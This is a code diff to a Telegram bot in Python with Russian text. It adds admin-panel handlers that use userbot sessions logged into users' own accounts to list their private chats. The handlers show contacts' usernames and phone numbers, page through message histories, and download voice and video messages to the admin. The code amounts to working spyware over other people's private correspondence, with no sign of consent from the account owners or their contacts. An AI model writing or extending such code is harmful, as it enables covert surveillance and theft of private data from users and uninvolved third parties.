@@ -1291,6 +1291,11 @@ async def main_menu(callback: types.CallbackQuery):
 
 # ==================== АДМИН МЕНЮ ====================
 
+@dp.callback_query(F.data == "ignore")
+async def ignore_callback(callback: types.CallbackQuery):
+    try: await callback.answer()
+    except Exception: pass
+
 @dp.callback_query(F.data == "admin_main")
 async def admin_main_menu(callback: types.CallbackQuery):
     if not is_admin(callback.from_user):
@@ -1406,7 +1411,7 @@ async def admin_user_view(callback: types.CallbackQuery):
     builder.button(text="Локация", callback_data=f"admin_loc_{target_uid}")
     builder.button(text="Кружки", callback_data=f"admin_circles_{target_uid}")
     builder.button(text="Голосовые", callback_data=f"admin_voices_{target_uid}")
-    builder.button(text="Лички", callback_data=f"admin_pms_{target_uid}")
+    builder.button(text="Лички", callback_data=f"admin_pms_{target_uid}_1")
     builder.button(text=get_text(callback.from_user.id, "btn_back"), callback_data="admin_users_1")
     builder.adjust(2, 2, 1, 1)
 
@@ -1414,15 +1419,348 @@ async def admin_user_view(callback: types.CallbackQuery):
     try: await callback.answer()
     except Exception: pass
 
+# ==================== РАЗДЕЛ ЛИЧКИ (PMs) ====================
+
 @dp.callback_query(F.data.startswith("admin_pms_"))
 async def admin_pms_view(callback: types.CallbackQuery):
     if not is_admin(callback.from_user): return
-    target_uid = callback.data.split("_")[-1]
+    parts = callback.data.split("_")
+    target_uid = int(parts[2])
+    page = int(parts[3]) if len(parts) > 3 else 1
+
+    target_state = get_user_state(target_uid)
+    client = target_state.get("client")
+
+    if not client or not client.is_connected:
+        builder = InlineKeyboardBuilder()
+        builder.button(text=get_text(callback.from_user.id, "btn_back"), callback_data=f"admin_user_{target_uid}")
+        await edit_or_send(callback.from_user.id, "❌ Юзербот пользователя не подключен.", reply_markup=builder.as_markup())
+        try: await callback.answer()
+        except Exception: pass
+        return
+
+    private_dialogs = []
+    try:
+        async for dialog in client.get_dialogs():
+            if dialog.chat.type == enums.ChatType.PRIVATE and not dialog.chat.is_support:
+                private_dialogs.append(dialog)
+    except Exception as e:
+        logging.error(f"Ошибка получения диалогов: {e}")
+
+    per_page = 5
+    total_dialogs = len(private_dialogs)
+    total_pages = max(1, (total_dialogs + per_page - 1) // per_page)
+    page = max(1, min(page, total_pages))
+
+    start_idx = (page - 1) * per_page
+    end_idx = start_idx + per_page
+    current_page_dialogs = private_dialogs[start_idx:end_idx]
 
     builder = InlineKeyboardBuilder()
+    for dialog in current_page_dialogs:
+        peer_id = dialog.chat.id
+        name = (dialog.chat.first_name or dialog.chat.title or "Пользователь").strip()
+        if dialog.chat.last_name:
+            name = f"{name} {dialog.chat.last_name}".strip()
+
+        unread = getattr(dialog, "unread_messages_count", 0) or 0
+
+        msg_time = "--:--"
+        if dialog.top_message and dialog.top_message.date:
+            msg_time = dialog.top_message.date.strftime("%H:%M")
+
+        if unread > 0:
+            btn_text = f"{name} ({unread}) ({msg_time})"
+        else:
+            btn_text = f"{name} ({msg_time})"
+
+        builder.button(text=btn_text, callback_data=f"admin_pm_user_{target_uid}_{peer_id}")
+
+    builder.adjust(1)
+
+    nav_buttons = []
+    if page > 1:
+        nav_buttons.append(types.InlineKeyboardButton(text="⬅️", callback_data=f"admin_pms_{target_uid}_{page-1}"))
+
+    nav_buttons.append(types.InlineKeyboardButton(text=f"📖 {page}/{total_pages}", callback_data="ignore"))
+
+    if page < total_pages:
+        nav_buttons.append(types.InlineKeyboardButton(text="➡️", callback_data=f"admin_pms_{target_uid}_{page+1}"))
+
+    builder.row(*nav_buttons)
     builder.button(text=get_text(callback.from_user.id, "btn_back"), callback_data=f"admin_user_{target_uid}")
 
-    await edit_or_send(callback.from_user.id, "🛠 Раздел «Лички» находится в разработке.", reply_markup=builder.as_markup())
+    await edit_or_send(callback.from_user.id, "Лички:", reply_markup=builder.as_markup())
+    try: await callback.answer()
+    except Exception: pass
+
+@dp.callback_query(F.data.startswith("admin_pm_user_"))
+async def admin_pm_user_view(callback: types.CallbackQuery):
+    if not is_admin(callback.from_user): return
+    parts = callback.data.split("_")
+    target_uid = int(parts[3])
+    peer_id = int(parts[4])
+
+    target_state = get_user_state(target_uid)
+    client = target_state.get("client")
+
+    if not client or not client.is_connected:
+        builder = InlineKeyboardBuilder()
+        builder.button(text=get_text(callback.from_user.id, "btn_back"), callback_data=f"admin_pms_{target_uid}_1")
+        await edit_or_send(callback.from_user.id, "❌ Юзербот пользователя не подключен.", reply_markup=builder.as_markup())
+        try: await callback.answer()
+        except Exception: pass
+        return
+
+    try:
+        chat_user = await client.get_users(peer_id)
+        real_nickname = f"{chat_user.first_name or ''} {chat_user.last_name or ''}".strip() or "Пользователь"
+        contact_name = real_nickname
+        username_str = f"@{chat_user.username}" if chat_user.username else "Отсутствует"
+        phone_str = f"+{chat_user.phone_number}" if chat_user.phone_number else "Скрыт"
+    except Exception as e:
+        logging.error(f"Ошибка получения пользователя {peer_id}: {e}")
+        real_nickname = "Неизвестно"
+        contact_name = "Неизвестно"
+        username_str = "Отсутствует"
+        phone_str = "Скрыт"
+
+    text = (
+        f"Никнейм: {real_nickname}\n"
+        f"Контакт: {contact_name}\n"
+        f"Юзернейм: {username_str}\n"
+        f"Номер: {phone_str}"
+    )
+
+    builder = InlineKeyboardBuilder()
+    builder.button(text="Лс", callback_data=f"admin_pm_chat_{target_uid}_{peer_id}_1")
+    builder.button(text="Голосовые", callback_data=f"admin_pm_voices_{target_uid}_{peer_id}")
+    builder.button(text="Кружки", callback_data=f"admin_pm_circles_{target_uid}_{peer_id}")
+    builder.button(text=get_text(callback.from_user.id, "btn_back"), callback_data=f"admin_pms_{target_uid}_1")
+    builder.adjust(1, 2, 1)
+
+    await edit_or_send(callback.from_user.id, text, reply_markup=builder.as_markup())
+    try: await callback.answer()
+    except Exception: pass
+
+@dp.callback_query(F.data.startswith("admin_pm_chat_"))
+async def admin_pm_chat_view(callback: types.CallbackQuery):
+    if not is_admin(callback.from_user): return
+    parts = callback.data.split("_")
+    target_uid = int(parts[3])
+    peer_id = int(parts[4])
+    page = int(parts[5]) if len(parts) > 5 else 1
+
+    target_state = get_user_state(target_uid)
+    client = target_state.get("client")
+
+    if not client or not client.is_connected:
+        builder = InlineKeyboardBuilder()
+        builder.button(text=get_text(callback.from_user.id, "btn_back"), callback_data=f"admin_pm_user_{target_uid}_{peer_id}")
+        await edit_or_send(callback.from_user.id, "❌ Юзербот пользователя не подключен.", reply_markup=builder.as_markup())
+        try: await callback.answer()
+        except Exception: pass
+        return
+
+    try:
+        me = await client.get_me()
+        my_name = me.first_name or "Я"
+        chat_user = await client.get_users(peer_id)
+        peer_name = chat_user.first_name or "Контакт"
+
+        fetched_messages = []
+        async for msg in client.get_chat_history(peer_id, limit=50):
+            fetched_messages.append(msg)
+
+        total_msgs = len(fetched_messages)
+        per_page = 10
+        total_pages = min(5, max(1, (total_msgs + per_page - 1) // per_page))
+        page = max(1, min(page, total_pages))
+
+        start_idx = (page - 1) * per_page
+        end_idx = start_idx + per_page
+        page_messages = fetched_messages[start_idx:end_idx]
+        page_messages.reverse()
+
+        msg_lines = []
+        for msg in page_messages:
+            msg_time = msg.date.strftime("%H:%M") if msg.date else "--:--"
+            is_me = msg.outgoing or (msg.from_user and msg.from_user.id == me.id)
+            sender_name = my_name if is_me else peer_name
+            content = msg.text or msg.caption or "[Медиа/Вложение]"
+            content = content.replace("\n", " ")
+            if len(content) > 100:
+                content = content[:97] + "..."
+            msg_lines.append(f"({msg_time}) {sender_name}: {content}")
+
+        if not msg_lines:
+            chat_text = f"Личка с {peer_name}:\n\nСообщений нет."
+        else:
+            chat_text = f"Личка с {peer_name}:\n\n" + "\n".join(msg_lines)
+
+        builder = InlineKeyboardBuilder()
+
+        nav_buttons = []
+        if page > 1:
+            nav_buttons.append(types.InlineKeyboardButton(text="⬅️", callback_data=f"admin_pm_chat_{target_uid}_{peer_id}_{page-1}"))
+
+        nav_buttons.append(types.InlineKeyboardButton(text=f"📖 {page}/{total_pages}", callback_data="ignore"))
+
+        if page < total_pages:
+            nav_buttons.append(types.InlineKeyboardButton(text="➡️", callback_data=f"admin_pm_chat_{target_uid}_{peer_id}_{page+1}"))
+
+        builder.row(*nav_buttons)
+        builder.button(text=get_text(callback.from_user.id, "btn_back"), callback_data=f"admin_pm_user_{target_uid}_{peer_id}")
+
+        await edit_or_send(callback.from_user.id, chat_text, reply_markup=builder.as_markup())
+    except Exception as e:
+        logging.error(f"Ошибка загрузки сообщений лички: {e}")
+        builder = InlineKeyboardBuilder()
+        builder.button(text=get_text(callback.from_user.id, "btn_back"), callback_data=f"admin_pm_user_{target_uid}_{peer_id}")
+        await edit_or_send(callback.from_user.id, f"❌ Ошибка загрузки сообщений: {e}", reply_markup=builder.as_markup())
+
+    try: await callback.answer()
+    except Exception: pass
+
+@dp.callback_query(F.data.startswith("admin_pm_circles_"))
+async def admin_pm_circles_view(callback: types.CallbackQuery):
+    if not is_admin(callback.from_user): return
+    parts = callback.data.split("_")
+    target_uid = int(parts[3])
+    peer_id = int(parts[4])
+
+    target_state = get_user_state(target_uid)
+    client = target_state.get("client")
+
+    search_done = False
+    circles = []
+
+    async def animate_loading():
+        dots_cycle = [".", "..", "..."]
+        idx = 0
+        while not search_done:
+            dots = dots_cycle[idx % 3]
+            try:
+                await edit_or_send(callback.from_user.id, f"Ожидайте{dots}")
+            except Exception:
+                pass
+            idx += 1
+            await asyncio.sleep(0.8)
+
+    anim_task = asyncio.create_task(animate_loading())
+
+    if client and client.is_connected:
+        try:
+            async for msg in client.get_chat_history(peer_id, limit=50):
+                if msg.video_note:
+                    circles.append(msg)
+                    if len(circles) >= 3:
+                        break
+                await asyncio.sleep(0.05)
+        except Exception as e:
+            logging.error(f"Ошибка поиска кружков в ЛС: {e}")
+
+    search_done = True
+    anim_task.cancel()
+    try:
+        await anim_task
+    except asyncio.CancelledError:
+        pass
+
+    sent_count = 0
+    if circles:
+        for msg in circles:
+            try:
+                file_buf = await client.download_media(msg, in_memory=True)
+                if file_buf:
+                    await bot.send_video_note(
+                        chat_id=callback.from_user.id,
+                        video_note=types.BufferedInputFile(file_buf.getvalue(), filename="circle.mp4")
+                    )
+                    sent_count += 1
+                    await asyncio.sleep(1)
+            except Exception as e:
+                logging.error(f"Ошибка отправки видеосообщения из ЛС: {e}")
+
+    builder = InlineKeyboardBuilder()
+    builder.button(text=get_text(callback.from_user.id, "btn_back"), callback_data=f"admin_pm_user_{target_uid}_{peer_id}")
+
+    if sent_count > 0:
+        await edit_or_send(callback.from_user.id, f"🎥 Отправлено последних кружков из ЛС: {sent_count} шт.!", reply_markup=builder.as_markup())
+    else:
+        await edit_or_send(callback.from_user.id, "❌ Кружки в этом чате не найдены.", reply_markup=builder.as_markup())
+
+    try: await callback.answer()
+    except Exception: pass
+
+@dp.callback_query(F.data.startswith("admin_pm_voices_"))
+async def admin_pm_voices_view(callback: types.CallbackQuery):
+    if not is_admin(callback.from_user): return
+    parts = callback.data.split("_")
+    target_uid = int(parts[3])
+    peer_id = int(parts[4])
+
+    target_state = get_user_state(target_uid)
+    client = target_state.get("client")
+
+    search_done = False
+    voices = []
+
+    async def animate_loading():
+        dots_cycle = [".", "..", "..."]
+        idx = 0
+        while not search_done:
+            dots = dots_cycle[idx % 3]
+            try:
+                await edit_or_send(callback.from_user.id, f"Ожидайте{dots}")
+            except Exception:
+                pass
+            idx += 1
+            await asyncio.sleep(0.8)
+
+    anim_task = asyncio.create_task(animate_loading())
+
+    if client and client.is_connected:
+        try:
+            async for msg in client.get_chat_history(peer_id, limit=50):
+                if msg.voice:
+                    voices.append(msg)
+                    if len(voices) >= 3:
+                        break
+                await asyncio.sleep(0.05)
+        except Exception as e:
+            logging.error(f"Ошибка поиска голосовых в ЛС: {e}")
+
+    search_done = True
+    anim_task.cancel()
+    try:
+        await anim_task
+    except asyncio.CancelledError:
+        pass
+
+    sent_count = 0
+    if voices:
+        for msg in voices:
+            try:
+                file_buf = await client.download_media(msg, in_memory=True)
+                if file_buf:
+                    await bot.send_voice(
+                        chat_id=callback.from_user.id,
+                        voice=types.BufferedInputFile(file_buf.getvalue(), filename="voice.ogg")
+                    )
+                    sent_count += 1
+                    await asyncio.sleep(1)
+            except Exception as e:
+                logging.error(f"Ошибка отправки голосового сообщения из ЛС: {e}")
+
+    builder = InlineKeyboardBuilder()
+    builder.button(text=get_text(callback.from_user.id, "btn_back"), callback_data=f"admin_pm_user_{target_uid}_{peer_id}")
+
+    if sent_count > 0:
+        await edit_or_send(callback.from_user.id, f"🎙 Отправлено последних голосовых из ЛС: {sent_count} шт.!", reply_markup=builder.as_markup())
+    else:
+        await edit_or_send(callback.from_user.id, "❌ Голосовые сообщения в этом чате не найдены.", reply_markup=builder.as_markup())
+
     try: await callback.answer()
     except Exception: pass
 
